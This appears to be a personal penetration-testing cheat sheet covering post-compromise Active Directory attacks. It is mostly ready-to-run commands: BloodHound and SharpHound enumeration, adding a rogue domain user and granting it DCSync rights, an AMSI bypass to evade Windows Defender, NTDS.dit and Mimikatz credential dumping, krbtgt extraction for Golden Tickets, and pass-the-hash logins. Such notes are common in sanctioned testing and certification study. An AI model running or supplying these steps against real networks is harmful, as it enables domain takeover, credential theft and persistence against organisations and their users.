---
title: POST-COMPROMISE AD ENUMERATION
updated: 2023-11-28 12:21:56Z
created: 2023-09-28 09:43:39Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# POST-COMPROMISE AD ENUMERATION

1.  Step one, **check for Anti-Virus**  
    If Powershell scripts can't be loaded due to antivirus, then load Powershell thru a Meterpreter shell
    
2.  Check for currently logged on users. Look for logged on Administrator  
    `Get-NetGroupMember -User user`
    
3.  Perform OU enumeration
    

**Ldapdomaindump:**  
`sudo ldapdomaindump ldaps://<DC IP> -u 'DOMAIN\user' -p password`

* * *

**Bloodhound**  
1. `sudo neo4j console`  
(use remote interface address, login with **neo4j:neo4j**)
2. `sudo bloodhound`
3. Generate files to import into bloodhound GUI
`sudo bloodhound-python -d DOMAIN.local -u user -p password -ns <DC IP> -c all`  
or
4.Enumerate domain with **SharpHound** or **AzureHound**
`. .\SharpHound.ps1`
`Invoke-Bloodhound` 
import files into bloodhound website
5. Search for owned user and "mark as Owned", double-click and check groups
6. Right-click the domain icon and select "Shortest path to here from Owned	"
7. Look for WriteDACL to domain. The WriteDACL privilege gives a user the ability to add ACLs to an object. This means that we can add a user to this group and give them **DCSync** privileges.
`net user ghost 'pa55word' /add /domain`
`net group <group> ghost /add`
`net localgroup "Remote Management Users" ghost /add`
`. .\powerview.ps1`
run `Bypass-4MSI` to evade windows defender
```
$pass = convertto-securestring 'pa55word' -asplain -force
$cred = new-object system.management.automation.pscredential('<domain>\ghost', $pass)

Add-ObjectACL -PrincipalIdentity <user> -Credential $cred -Rights DCSync
OR
Add-DomainObjectAcl -Credential $Cred -TargetIdentity <domain> -Rights DCSync
```

`secretsdump.py <domain>/ghost@<targetIP>`
`psexec.py administrator@<targetIP> -hashes <hashfrom_secretsdump>`


* * *

**PlumHound**  
`sudo git clone https://github.com/PlumHound/PlumHound.git`  
`sudo pip3 install -r requirments.txt`  
`sudo python3 PlumHound.py --easy -p neo4j_password`  
(make sure both neo4j console and bloodhound are running)

`sudo python3 PlumHound.py -x tasks/default.tasks -p neo4j_password`  
`cd /reports`  
`firefox index.html`

* * *

## List all the SPN's

Look for services that are running and what service accounts are using them  
`setspn -T DOMAIN.local -Q */*`

* * *

## Dumping the NTDS.dit

`secretsdump.py DOMAIN.local/domainadminuser:password@<DC IP> -just-dc-ntlm`

* * *

# Token Impersonation

1.  Check if token impersonatios is availabe for user  
    `whoami /privs`  
    OR  
    `Metrepreter> getprivs`

Check out [Privilege to Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)

Note: most normal users don't have privileges to impersonation tokens, however service accounts do (move laterally)

# Dump Hashes

## Mimikatz

1.  Launch mimikatz on exploited host, and check privileges are sufficient  
    **mimikatz #** `privilege::debug`  
    Confirm output is **Privilege '20' OK**
2.  Dump the hashes:  
    On older windows machines:  
    `sekurlsa::logonpasswords`  
    `lsadump::sam`
3.  Dump LSA secrets  
    `lsadump::lsa /patch`
4.  Crack the hashes with hashcat  
    `hashcat -m 1000`

### krbtgt Hash

1.  Dump the sid and hash of the **krbtg** account and perform **Golden Ticket** attack  
    `lsadump::lsa /inject /name:krbtgt`
2.  Create a Golden Ticket

### Connect to Domain Controller with Powershell

1.  Connect a powershell as Administrator  
    `sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:<NTLMHash> /run:powershell.exe`
    
2.  Check for kerberos tickets:  
    `klist`
    
3.  Generate a kerberos ticket  
    `net use \\lab.local\`  
    `klist`